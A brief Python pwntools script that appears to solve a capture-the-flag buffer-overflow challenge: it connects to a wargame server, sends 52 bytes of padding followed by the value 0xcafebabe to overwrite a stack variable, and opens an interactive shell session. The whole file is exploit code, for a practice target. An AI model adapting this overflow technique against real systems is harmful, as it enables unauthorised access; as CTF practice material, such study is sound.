from pwn import *

p = remote("pwnable.kr", 9000) 

padding = b'A' * 52

exploit = p32(0xcafebabe)

payload = padding + exploit

p.sendline(payload)

p.interactive()

